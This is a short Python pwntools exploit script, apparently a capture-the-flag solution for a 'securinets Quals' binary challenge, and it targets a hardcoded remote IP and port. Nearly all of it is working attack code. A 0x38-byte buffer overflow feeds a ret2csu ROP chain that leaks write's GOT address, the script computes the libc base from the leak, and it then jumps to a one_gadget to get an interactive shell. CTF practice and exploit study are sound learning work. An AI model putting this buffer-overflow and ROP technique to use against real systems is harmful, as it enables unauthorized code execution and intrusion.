from pwn import*
i =3
one = [0x45216,0x4526a,0xf02a4,0xf1147]
context.log_level='debug'
#s=process(['baby1.dms'],env={"LD_PRELOAD":""})
s = remote('51.254.114.246', 1111)
#csu3 = 
callcsu=0x0000000004006A0
setcsu=0x0000000004006BA

start = 0x400500
write = 0x4004b0
write_got = 0x000000000601018
read = 0x4004c0
p_rdi=0x004006c3
p_rsi_r15=0x004006c1
s.recvuntil('Welcome to securinets Quals!')
junk = "A"*0x38
pay = junk+p64(p_rdi)+p64(1)+p64(p_rsi_r15)+p64(write_got)+p64(0)+p64(write)

#pay = junk+p64(setcsu)+p64(0)+p64(1)+p64(write)+p64(0)+p64(write_got)+p64(8)
rtc = ''
rtc += p64(setcsu)
rtc += p64(0) #rbx
rtc += p64(1) #rbp
rtc += p64(write_got) #r12
rtc += p64(8) #r13 == 3 arg
rtc += p64(write_got) #r14 2 arg
rtc += p64(1) #r15 1 arg

rtc += p64(callcsu)
rtc += "A"*8*7
#rtc += p64(0)
rtc += p64(start)

raw_input()
s.sendline(junk+rtc)
print hexdump(s.recv(8))
write_leaked = u64(s.recv(6)+'\x00\x00')
base = write_leaked -1012400
print hex(base)
s.recvuntil('Welcome to securinets Quals!')
s.sendline(junk+p64(base+one[i]))
s.interactive()
